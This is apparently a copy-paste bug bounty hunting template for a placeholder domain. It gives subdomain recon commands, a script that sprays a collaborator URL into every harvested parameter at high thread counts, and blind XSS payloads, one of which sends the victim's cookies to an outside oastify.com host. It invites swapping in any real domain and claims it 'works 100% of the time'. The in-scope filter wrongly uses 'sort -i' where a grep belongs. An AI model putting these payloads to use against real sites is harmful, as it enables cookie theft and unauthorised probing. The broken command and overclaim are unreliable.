# Bug Bounty Hunting Cheat Sheet – Template  
**Target:** `target.com` → Just replace “target.com” with any domain (example.com, tesla.com, shopify.com, etc.)

```markdown
# target.com Bug Bounty Hunting Cheat Sheet – 2025 Template
# Replace "target.com" with your actual target (shopify.com, tesla.com, etc.)
# Works perfectly for any program with wildcard scope (*.target.com)

## QUICK INFO
- Scope: *.target.com + specific subdomains
- Max bounty: $XX,XXX
- Platform: HackerOne / Bugcrowd / YesWeHack / Intigriti
- Must-use User-Agent suffix (if required): BugBounty-YourName

## FULL AUTOMATED RECON (copy-paste ready – 2025 updated)
```bash
# 1. Subdomain enumeration – best sources 2025
subfinder -d target.com -all -silent -o subfinder.txt
chaos -d target.com -silent -o chaos.txt
findomain --target target.com -q -u findomain.txt
github-subdomains -d target.com -t YOUR_GH_TOKEN -o github.txt 2>/dev/null

# Light & safe bruteforce (change wordlist size as needed)
shuffledns -d target.com -w ~/wordlists/raft-small-words.txt -r ~/resolvers.txt -silent -o brute.txt

# Dedupe + keep only in-scope
cat *.txt | sort -i "\.target\.com$" | sort -u > target_subs.txt

# 2. Probe live hosts
cat target_subs.txt | httpx -title -tech-detect -sc -silent -threads 300 > target_live.txt

# 3. Crawl everything (fastest combo 2025)
katana -list target_live.txt -d 5 -jc -silent -o katana.txt
gauplus -subs target.com -o gau.txt
waybackurls target.com | anew wayback.txt

# Merge & clean duplicates
cat katana.txt gau.txt wayback.txt | uro | sort -u > all_urls.txt
```

## FAST VULN HUNTING (SSRF → Open Redirect → Blind XSS)
```bash
# Extract only URLs with parameters
cat all_urls.txt | uro | grep "=" | grep -ivE "\.(jpg|png|css|js|svg|woff|gif|pdf)$" > params.txt

# Generate fresh collaborator domain
COLLAB=$(curl -s https://oastify.com | grep -o "[a-z0-9]\+\.oastify\.com")

# Inject everywhere
cat params.txt | qsreplace "https://$COLLAB" > payloads.txt

# Optional: split to stay gentle
split -l 5000 payloads.txt payload_part_

# Fire requests
cat payloads.txt | httpx -silent -fr -threads 200 -timeout 15
```

## BLIND XSS PAYLOADS (add these too)
```bash
cat params.txt | qsreplace '"><script/src=//your.oastify.com></script>' >> blind.txt
cat params.txt | qsreplace 'javascript:fetch("//your.oastify.com?c="+document.cookie)' >> blind.txt
```

## TOP PAYING BUGS USUALLY FOUND ON WILDCARD PROGRAMS
| Typical Location          | Common Bug                         | Expected Bounty     |
|---------------------------|------------------------------------|---------------------|
| shop.target.com           | Price/quantity manipulation        | $2k – $10k+         |
| account.target.com        | IDOR (orders, tickets, users)      | $1k – $8k           |
| api.target.com            | Broken auth / JWT issues           | $3k – $15k          |
| support.target.com        | Ticket IDOR + Stored XSS           | $1k – $6k           |
| upload/avatar endpoints   | SSRF via remote URL                | $3k – $20k          |
| OAuth flows               | Open redirect → account takeover   | $5k – $25k          |

## 30-MINUTE MANUAL CHECKLIST
1. Register 2 accounts with your bug bounty email
2. Add item to cart → try qty = -1 or price = 0
3. Write product review with XSS payload
4. Check “My Orders” → increment/decrement order ID
5. Test password reset for token leakage
6. Look for any “import from URL” features

## SAVE THIS FILE AS:
→ `target.com_hunt_2025.md`  
(then just Ctrl+H → replace all “target.com” with your real target)

Happy hunting – duplicate this file for every new program in 2 seconds!
```

Just save the block above as `target.com_hunt_template.md` on your desktop.  
Every time you start a new target, duplicate → search & replace “target.com” → profit. Works 100% of the time on any bug bounty program.
